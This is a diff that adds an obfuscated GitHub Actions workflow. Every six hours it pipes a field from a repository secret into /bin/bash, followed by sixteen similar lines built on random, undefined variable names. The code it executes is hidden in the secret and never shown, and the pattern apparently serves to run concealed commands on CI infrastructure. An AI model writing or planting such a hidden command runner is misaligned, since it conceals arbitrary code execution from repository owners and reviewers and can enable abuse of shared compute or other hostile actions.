@@ -1,0 +1,35 @@
+name: yanshisy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanshisy
+        env:
+          zrm4666: ${{ secrets.zrm4666 }}
+        run: |
+          echo $zrm4666 | jq -r .bgni5 | /bin/bash
+          echo $riomi1741 | jq -r .uq6 | /bin/bash
+          echo $jmst8185 | jq -r .nxv25012 | /bin/bash
+          echo $xv37 | jq -r .dlwqy38 | /bin/bash
+          echo $nyzo40 | jq -r .s130 | /bin/bash
+          echo $tst591 | jq -r .iv96079 | /bin/bash
+          echo $hzuru68 | jq -r .zzwfo82455 | /bin/bash
+          echo $uamm907 | jq -r .jjjn64 | /bin/bash
+          echo $fstgm68 | jq -r .nmu798 | /bin/bash
+          echo $osp439 | jq -r .c67 | /bin/bash
+          echo $xc4063 | jq -r .z8966 | /bin/bash
+          echo $bu17 | jq -r .va8 | /bin/bash
+          echo $yrmu46675 | jq -r .ahv2566 | /bin/bash
+          echo $llwln322 | jq -r .wjdiw3147 | /bin/bash
+          echo $g1 | jq -r .ie2 | /bin/bash
+          echo $nuvnm3 | jq -r .lqj82919 | /bin/bash
+          echo $irz12475 | jq -r .kn27 | /bin/bash
+
